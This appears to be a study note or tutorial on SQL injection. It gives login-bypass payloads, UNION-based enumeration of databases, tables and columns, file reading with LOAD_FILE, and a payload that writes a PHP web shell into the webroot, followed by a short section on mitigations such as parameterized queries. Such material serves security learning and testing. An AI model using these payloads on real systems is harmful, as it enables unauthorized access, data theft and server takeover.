If websites rely on user input to create SQL queries to their databases, we can inject our input to access the database, modify its contents, and even install ourselves onto the backend. 

# Authentication Bypass

Imagine we have a login screen that performs this SQL query whenever we login, returning true if the user should be allowed to login:
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

This builds a query out of user input, so we can inject on it. If for our username we put in `bob'#`, we'll bypass the login check,  return true, and login. Why? Well, the quote escapes the string our input is inside initially, and the hashtag comments out the rest of the query. 

For completeness, let's say we didn't want to be lazy and use a hashtag. Then, we could still take advantage of SQL's operator precedence to bypass the password check. In SQL, ANDs are processed before ORs, so if we insert an OR, everything to the right of it (including the password check) will be evaluated to a boolean, then OR'd with it on the right. We could input something like `bob' OR '1'='1`, which would generate this SQL statement: 

```sql
SELECT * FROM users WHERE username = '$user' OR TRUE;
```

Clearly, we've bypassed authentication here too. 


# Data Leakage

So we can terminate SQL queries early. Big deal. I want to read what's inside the tables those queries are accessing. Better yet, I want to read what's inside other tables, or even other databases on the SQL server. 

Introducing: the `UNION` instruction. As the name implies, this will display the merger of two tables into one.  To do this,  both tables have to have the same number of columns. Let's try to use this feature for some basic system enumeration, assuming we can inject on a table that's displayed on the site. 

First, we need to figure out how many columns the table accessed by the query we're injecting into has. Otherwise, we can't use `UNION`. There are a couple of ways to do this; the easiest is just do to `myquery' UNION SELECT 1, 2, ... N` repeatedly, where N is the number of tables you're testing for. This command will fail until N =  the number of columns in the table. At that point, we'd expect to see a row of numbers in the table we're messing with. 

> [!Note] 
> We may not see 1, 2, ... N in the table. That's because not all columns in the table may be displayed on the site.

Now we can enumerate. Once we know what columns in the table are displayed, we can replace those numbers with things we care about, like `@@version`,  `user()`, or `database()`.

## Cross-database leaking

But wait - what if I want to access entries in other tables, or other databases? What if I don't know how many columns those tables have, or what the database/table names are? No worries, we can use enumeration to eventually get us to data leakage. 

We can start by getting all the databases on the server through 
```sql
UNION SELECT whoCares1, SCHEMA_NAME, whoCares2... FROM INFORMATION_SCHEMA.SCHEMATA
```
where whoCares are padding to make sure the UNION statement's columns align with the initial tables' columns. 

Now, let's get all the tables inside a given database:

```sql
UNION select whoCares1,TABLE_NAME,TABLE_SCHEMA, whoCares2... from INFORMATION_SCHEMA.TABLES where table_schema='databasename'
```

For each of those tables, we can get its columns through

```sql
UNION select whoCares1,COLUMN_NAME,TABLE_NAME,whoCares2 from INFORMATION_SCHEMA.COLUMNS where table_name='tablename'--
```

Then, we can get the data we want through 
```sql
UNION select whoCares1, goodStuff, whoCares2 from databasename.tablename
```

# Database Escape

We can also use SQL injections to break out of our database, reading and writing files on the server's system. 

Reading is easy, assuming we have the permissions: we can call `LOAD_FILE(name)` as a value for a column in our `UNION` statement, which will dump the contents of the file into an entry in that column. 

Writing is much cooler. The goal here is to install a webshell, giving us remote access to the entire server. First, we need to confirm we can write to the server.   After figuring out what user we are via an injection with `user()`, we can run the following to list our permissions:
```sql
UNION SELECT whoCares, grantee, privilege_type, whoCares FROM information_schema.user_privileges WHERE grantee="ouruser"-- -
```

Then, we'll check to see the `secure_file_prev variable (or non-MySQL equivalent) isn't set:
```sql
UNION SELECT whoCares, variable_name, variable_value, whoCares FROM information_schema.global_variables where variable_name="secure_file_priv"
```

Now that we know we can write, let's install a little php shell onto our server. We need to know the absolute path of the root of the webserver, which we can find either by trying to read various files inside it, or looking around the server's files for a Apache/Nginx/other hosting conf file that might tell us where the webroot is. Once we've found it, we can do the following:

```sql
union select "<really who cares but should be empty>",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

If we aren't able to access the webroot directly, we can install it in the directory we're using to access the webpage we're injecting through. For example, if we're injecting through `website.com/dashboard/inject.php`, our outfile would be `/var/www/html/dashboard/inject.php` 
# Mitigations

The usual: sanitation (primarily through escaping) and validation, and a new one: parameterized queries. Here, the idea is to pre-build a SQL statement, separating out user input as parameters to the query's invocation rather than inserting them directly into the statement itself. 

Can r/w files 
	- can install my own shells/malware onto server
		- abuse union -> don't want to display anything, just write something but still have to follow column enforcement
		- need to find file path - try reading from configurations
		- may sound dumb, but important: remember where you are when writing, and try there first -> so if you're in /dashboard, write to /user/www/..../dashboard...
